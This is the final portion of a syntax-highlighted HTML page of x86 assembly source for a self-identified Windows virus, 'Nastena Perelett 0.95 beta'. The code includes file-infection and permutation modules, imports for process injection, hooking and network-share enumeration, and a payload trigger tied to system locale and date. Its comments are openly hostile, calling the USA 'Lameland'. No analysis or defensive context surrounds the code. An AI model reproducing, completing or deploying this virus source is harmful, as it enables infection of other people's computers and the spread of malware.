    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_mpr</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">__57</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_Default</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">__mpr</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">mpr_api_num</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_apis</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">share</span><span class="sc0">

</span><span class="sc5">__57</span><span class="sc4">:</span><span class="sc0">   
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">vir_exit2</span><span class="sc0">
</span><span class="sc1">; *** end of thread3</span><span class="sc0">

    </span><span class="sc1">; thread initializing</span><span class="sc0">
</span><span class="sc5">initthread</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; set low priority</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">GetCurrentThread</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">15</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">SetThreadPriority</span><span class="sc0">

    </span><span class="sc1">; allocate memory for buffers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">loader_size</span><span class="sc4">*</span><span class="sc5">loader_mult</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_valloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">loaderbuf</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc1">; init tbl</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2048</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_valloc</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">tbl</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">disasm_init</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">setmode</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc1">; this is a test of locale</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; 8 bytes in stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">LOCALE_ICOUNTRY</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">LOCALE_ICOUNTRY</span><span class="sc0">
</span><span class="sc5">LOCALE_USER_DEFAULT</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">LOCALE_USER_DEFAULT</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">GetLocaleInfoA</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0031h</span><span class="sc0">  </span><span class="sc1">; if we are in Lameland (USA) then activate </span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">jg</span><span class="sc0"> </span><span class="sc5">incubate</span><span class="sc0"> 

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">act</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc1">; дата</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">systimestruct</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">xcall</span><span class="sc0"> </span><span class="sc5">GetLocalTime</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">day</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">month</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">  </span><span class="sc1">; every 16 days</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">NORELEASE</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">incubate</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">RELEASE</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">incubate</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">   

    </span><span class="sc1">;  activate</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">act</span><span class="sc4">-</span><span class="sc5">rec</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">incubate</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">



</span><span class="sc5">max</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2000</span><span class="sc0">
</span><span class="sc5">mutexname</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"ZMX"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; mutex name</span><span class="sc0">
</span><span class="sc5">hmutex</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">eaxapi2.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">efork.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">valloc.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">lde32bin.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">inf.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">infectd.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">find.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">sethook.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">recinf.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">perm.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">share.inc</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">console.inc</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">kernel32_api_num</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">69</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">LoadLibraryA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">OpenProcess</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetVersion</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetCurrentThread</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SetThreadPriority</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateToolhelp32Snapshot</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">Module32First</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">Module32Next</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetCurrentProcessId</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetCurrentProcess</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">MapViewOfFile</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CloseHandle</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">VirtualAlloc</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">VirtualFree</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GlobalAlloc</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GlobalFree</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateThread</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateEventA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">ReadProcessMemory</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">WriteProcessMemory</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">VirtualProtectEx</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetModuleHandleA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">DuplicateHandle</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">Sleep</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">ReleaseMutex</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">OpenMutex</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateMutex</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateProcessA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateProcessW</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">WaitForDebugEvent</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">WaitForSingleObject</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">ContinueDebugEvent</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">TerminateProcess</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetCurrentDirectoryA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">FindFirstFileA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">FindNextFileA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">FindClose</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetWindowsDirectoryA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">lstrcmpiA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SetThreadContext</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetThreadContext</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SuspendThread</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">AllocConsole</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">VirtualProtect</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">ResumeThread</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">TerminateThread</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetFileSize</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">PulseEvent</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SetEvent</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CopyFileA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">DeleteFileA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetThreadSelectorEntry</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">WriteFile</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetStdHandle</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetLocalTime</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SetConsoleTitleA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">RegisterServiceProcess</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">Beep</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetLocaleInfoA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SetFileTime</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateDirectoryA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">RemoveDirectoryA</span><span class="sc0">

</span><span class="sc5">_user32</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"user32"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">user32_api_num</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SetWindowsHookEx</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">UnhookWindowsHookEx</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CallNextHookEx</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">SendMessageA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetWindowThreadProcessId</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">FindWindowA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateWindowExA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateWindowExW</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">MessageBoxExA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">MessageBoxExW</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">MessageBoxW</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">DialogBoxParamA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">DialogBoxParamW</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">DialogBoxIndirectParamA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">DialogBoxIndirectParamW</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateDialogParamA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">CreateDialogParamW</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetWindow</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">GetForegroundWindow</span><span class="sc0">

</span><span class="sc5">_psapi</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"psapi"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">psapi_api_num</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">EnumProcessModules</span><span class="sc0">

</span><span class="sc5">_mpr</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"mpr"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mpr_api_num</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">WNetOpenEnumA</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">WNetCloseEnum</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">WNetEnumResourceA</span><span class="sc0">


</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_msvcrt</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"msvcrt"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">msvcrt_api_num</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">declfunc</span><span class="sc0">    </span><span class="sc5">sprintf</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Nastena Perelett 0.95 beta"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; name</span><span class="sc0">

</span><span class="sc5">replace_struc</span><span class="sc0">   </span><span class="sc9">struc</span><span class="sc0">
</span><span class="sc5">from_rva</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">to_rva</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sizeinbytes</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">replace_struc</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">; static variables</span><span class="sc0">
</span><span class="sc5">vloader_size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">vvir_size</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">; replace struct</span><span class="sc0">
</span><span class="sc5">replace</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">*(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">replace_struc</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">jmpreplace</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">*(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">replace_struc</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">loader_mult</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">backup</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">+</span><span class="sc5">loader_size</span><span class="sc4">*</span><span class="sc5">loader_mult</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc1">; multiplier due to permutation</span><span class="sc0">
</span><span class="sc5">jmpsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">jmpbackup</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc5">jmpsize</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">isjmp</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">dropper</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">isseh</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ev</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">act</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">systimestruct</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">year</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0766h</span><span class="sc0">
</span><span class="sc5">month</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0544h</span><span class="sc0">
</span><span class="sc5">dayweek</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0453h</span><span class="sc0">
</span><span class="sc5">day</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0346h</span><span class="sc0">
</span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">04574h</span><span class="sc4">,</span><span class="sc2">02346h</span><span class="sc4">,</span><span class="sc2">07675h</span><span class="sc4">,</span><span class="sc2">06555h</span><span class="sc0">

</span><span class="sc5">_inj_code_size</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">thread2</span><span class="sc0">
</span><span class="sc5">stacksize</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">thread2</span><span class="sc0"> </span><span class="sc1">;$-start</span><span class="sc0">
</span><span class="sc5">virsize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">_start</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">".end."</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span></div></body>
</html>
